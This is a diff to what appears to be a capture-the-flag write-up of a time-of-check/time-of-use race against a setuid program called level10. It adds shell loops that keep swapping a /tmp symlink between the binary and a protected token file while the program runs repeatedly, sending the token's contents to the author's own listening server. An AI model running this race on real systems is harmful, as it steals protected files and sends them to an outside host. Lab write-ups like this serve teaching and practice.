@@ -12,11 +12,19 @@ Warning: Using access() to check if a user is authorized to, for example, open a
 i created a ruby server to sit on 6969 port and recieve message
 
 than i created bash script which is constantly creating two sym links:
-ln -sf ~/level10 /tmp/exploit
-ln -sf ~/token /tmp/exploit
+while true; do 
+	ln -fs ~/level10 /tmp/exploit; 
+	ln -fs ~/token /tmp/exploit; 
+done
 
 
 than i launched ./level10 /tmp/exploit ip in infinite loop:
+
+
+while true; do 
+./level10 /tmp/exploit my_server_ip; 
+done
+
 so i needed to get in place where level10 rights were assigned to /tmp/exploit
 but content of tmp/exploit was actually ~/token
 
